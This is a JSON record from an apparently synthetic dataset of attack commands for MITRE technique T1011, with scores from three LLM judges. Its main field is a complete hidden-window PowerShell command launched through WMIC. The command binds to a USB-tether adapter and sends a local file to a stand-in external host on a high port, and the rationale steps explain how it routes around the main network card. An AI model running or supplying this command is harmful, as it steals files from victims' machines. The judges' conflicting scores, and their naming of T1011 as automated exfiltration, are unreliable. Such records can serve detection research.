{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Uses WMIC to invoke PowerShell that binds to a USB tethering (Remote NDIS) adapter and exfiltrates a file to an external host using a high TCP port. This exploits a USB-backed network path distinct from the primary NIC.",
  "rationale_steps": [
    "Detect a USB tethering NIC via its Remote NDIS description.",
    "Bind the TCP client to that interface to force egress over USB tether.",
    "Connect to an uncommon port on the exfiltration server.",
    "Send the selected file over the alternate network medium per T1011.",
    "Refrain from system-level network configuration changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-e65af2df",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 2,
        "syntactic_justification": "The command omits proper quoting for the PowerShell -Command payload and uses unnecessary backticks before variable sigils, making parsing likely to fail despite otherwise balanced quotes and separators.",
        "semantic_score": 4,
        "semantic_justification": "Conceptually it automates exfiltration by selecting a USB RNDIS interface, binding a TcpClient, connecting to a remote host, and sending a file\u2019s bytes, though the example IP is a documentation network and the raw TCP sink must be prepared.",
        "combined_score": 3.0,
        "confidence": 0.6,
        "timestamp": "2025-10-01T03:03:22.308239Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, correct PowerShell syntax with appropriate variable declarations, and proper escape sequences for nested command execution.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with the T1011 Automated Exfiltration technique as it uses WMIC to launch PowerShell that identifies a specific network adapter, establishes a TCP connection to an external IP address, and automatically exfiltrates the contents of a file over that connection.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T03:03:25.494826Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with correct escaping for PowerShell variables within the WMIC-invoked string and balanced quotes and parentheses.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with Automated Exfiltration (T1011), using appropriate tools and robust logic to identify a specific network adapter, read a file, and exfiltrate it over a raw TCP connection, operationally plausible without elevated privileges.",
        "combined_score": 5.0,
        "confidence": 1.0,
        "timestamp": "2025-10-01T05:38:01.950926Z"
      }
    ],
    "llm_average_syntactic": 4.0,
    "llm_average_semantic": 4.667,
    "llm_average_score": 4.333,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}